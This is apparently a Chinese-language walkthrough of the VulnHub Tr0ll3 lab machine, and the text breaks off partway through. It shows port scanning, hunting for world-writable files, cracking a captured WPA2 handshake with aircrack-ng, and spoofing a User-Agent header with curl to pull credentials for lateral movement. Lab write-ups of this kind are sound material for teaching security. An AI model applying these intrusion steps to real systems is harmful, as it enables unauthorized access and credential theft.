# Troll 3
> https://download.vulnhub.com/tr0ll/Tr0ll3.ova
>
> ssh：`start:here`
靶场IP：`192.168.32.174`
![image-20220718141329252](../../.gitbook/assets/image-20220718141329252.png)
扫描对外端口
```
┌──(root💀kali)-[~/Desktop]
└─# nmap -p1-65535 192.168.32.174                                                                                                                                                                                                      
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-18 02:13 EDT
Nmap scan report for 192.168.32.174
Host is up (0.00073s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
MAC Address: 00:0C:29:BB:B3:A9 (VMware)
Nmap done: 1 IP address (1 host up) scanned in 2.09 seconds
```
直接SSH登录
![image-20220718141526812](../../.gitbook/assets/image-20220718141526812.png)
查看当前目录信息
```
start@Tr0ll3:~$ ls
bluepill  redpill
start@Tr0ll3:~$ cd bluepill/
start@Tr0ll3:~/bluepill$ ls
awesome_work
start@Tr0ll3:~/bluepill$ cat awesome_work 
http://bfy.tw/ODa
start@Tr0ll3:~/bluepill$ cd ~/redpill/
start@Tr0ll3:~/redpill$ ls
this_will_surely_work
start@Tr0ll3:~/redpill$ cat this_will_surely_work 
step2:Password1!
start@Tr0ll3:~/redpill$ 
```
该文件`awesome_work`只包含 URL http://bfy.tw/ODa。如果我们访问给定的链接，我们将被转发到_www.lmgtfy.com_（让我为你谷歌一下），并询问"你如何让黑客浪费时间"。所以很明显，这条线索是一条死胡同，被放在那里是开玩笑的。
随着故事的进展，我们一次又一次地看到类似的信息，只是为了分散注意力。这台机器名副其实，并在任何可能的地方"控制"我们。
`this_will_surely_work`目录中的文件`redpill`包含字符串`step2:Password1!`。我们的直觉告诉我们，这些必须是下一个凭据。但是如果我们尝试使用给定的信息登录，我们只会收到一条错误消息。再一次，这只是一个诱饵。
使用该命令`find / -type f -perm 0777 2>/dev/null`，我们可以列出所有用户都可以读取和编辑的文件，无论其所有者如何。这使我们能够识别第一个实际线索：
```
start@Tr0ll3:~/redpill$ find / -type f -perm 0777 2>/dev/null
/var/log/.dist-manage/wytshadow.cap
/.hints/lol/rofl/roflmao/this/isnt/gonna/stop/anytime/soon/still/going/lol/annoyed/almost/there/jk/no/seriously/last/one/rofl/ok/ill/stop/however/this/is/fun/ok/here/rofl/sorry/you/made/it/gold_star.txt
```
一方面，我们可以读取`wytshadow.cap`目录中的文件 `/var/log/.dist-manage/`。这似乎是对包括 WPA2 握手在内的网络流量的捕获。
下载到本地进行WIFI密码爆破
![image-20220718142025469](../../.gitbook/assets/image-20220718142025469.png)
```
aircrack-ng -w gold_star.txt wytshadow.cap
```
![image-20220718145030854](../../.gitbook/assets/image-20220718145030854.png)
wytshadow用户爆破出密码为`gaUoCe34t1`
```
start@Tr0ll3:/tmp$ su wytshadow
Password: 
wytshadow@Tr0ll3:/tmp$ id
uid=1003(wytshadow) gid=1003(wytshadow) groups=1003(wytshadow)
```
如果我们查看 的主目录`wytshadow`，该文件会`oohfun`立即引起我们的注意。该文件设置了 SUID 位，它允许我们以用户的权限运行程序`genphlux`。
```
wytshadow@Tr0ll3:~$ ls -al
total 40
drwx------  4 wytshadow wytshadow 4096 Aug  2  2019 .
drwxr-xr-x 10 root      root      4096 Jun 19  2015 ..
-rw-r--r--  1 wytshadow wytshadow  220 Jun 17  2015 .bash_logout
-rw-r--r--  1 wytshadow wytshadow 3637 Jun 17  2015 .bashrc
drwx------  2 wytshadow wytshadow 4096 Jun 17  2015 .cache
drwx------  3 wytshadow wytshadow 4096 Aug  1  2019 .gnupg
-rwsrwxrwx  1 genphlux  root      8566 Jun 17  2015 oohfun
-rw-r--r--  1 wytshadow wytshadow  675 Jun 17  2015 .profile
```
查看sudo列表
```
wytshadow@Tr0ll3:~$ sudo -l
[sudo] password for wytshadow: 
Matching Defaults entries for wytshadow on Tr0ll3:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User wytshadow may run the following commands on Tr0ll3:
    (root) /usr/sbin/service nginx start
```
然而，当我们实际运行时`oohfun`，我们只是不断地得到输出`iM Cr@zY L1k3 AAA LYNX`：
![image-20220718143138158](../../.gitbook/assets/image-20220718143138158.png)
如果我们使用 来检查文件内容`strings`，我们可以看到它包含以下行：
```
/lol/bin/run.sh -b 0.0.0.0
```
![image-20220718143216692](../../.gitbook/assets/image-20220718143216692.png)
```
wytshadow@Tr0ll3:~$ cat /lol/bin/run.sh
#!/bin/sh
while true;do echo "iM Cr@zY L1k3 AAA LYNX"; done
```
我们可以看到`wytshadow`允许用户启动nginx web server服务，这就是我们接下来要做的：
```
wytshadow@Tr0ll3:~$ sudo service nginx start
```
使用 对打开的端口进行本地检查以`netstat`确认 Web 服务器的成功启动。我们现在可以在端口 8080 上看到新服务。
![image-20220718143331983](../../.gitbook/assets/image-20220718143331983.png)
但是，我们无法访问 Web 服务，因为所有请求都被拒绝并显示`403 Forbidden`错误消息。
![image-20220718143415981](../../.gitbook/assets/image-20220718143415981.png)
为了缩小问题范围，我们打开文件`/etc/nginx/sites-ed/default`并查看 nginx Web 服务器的默认配置。一开始，我们注意到以下块：
```
server {
        listen 8080 default_server;
        listen [::]:8080 default_server;
            if ($http_user_agent !~ "Lynx*"){
                return 403;
}
```
如果请求不包含 user-agent `Lynx`，服务器将始终以 403 错误响应。由于该文件不幸是只读的，我们无法更改配置。但是，使用 curl 我们可以以预期的格式附加我们自己的用户代理标头。
```
┌──(root💀kali)-[~/Desktop]
└─# curl  -H "User-Agent: Lynx Basto"  http://192.168.32.174:8080
genphlux:HF9nd0cR!
```
```
wytshadow@Tr0ll3:~$ su genphlux
Password: 
genphlux@Tr0ll3:/home/wytshadow$ id
uid=1004(genphlux) gid=1004(genphlux) groups=1004(genphlux)
```
查看当前目录
```
genphlux@Tr0ll3:~$ ls -al
total 44
drwx------  4 genphlux genphlux 4096 Aug  2  2019 .
drwxr-xr-x 10 root     root     4096 Jun 19  2015 ..
-rw-r--r--  1 genphlux genphlux  220 Jun 17  2015 .bash_logout
-rw-r--r--  1 genphlux genphlux 3637 Jun 17  2015 .bashrc
drwx------  2 genphlux genphlux 4096 Jun 17  2015 .cache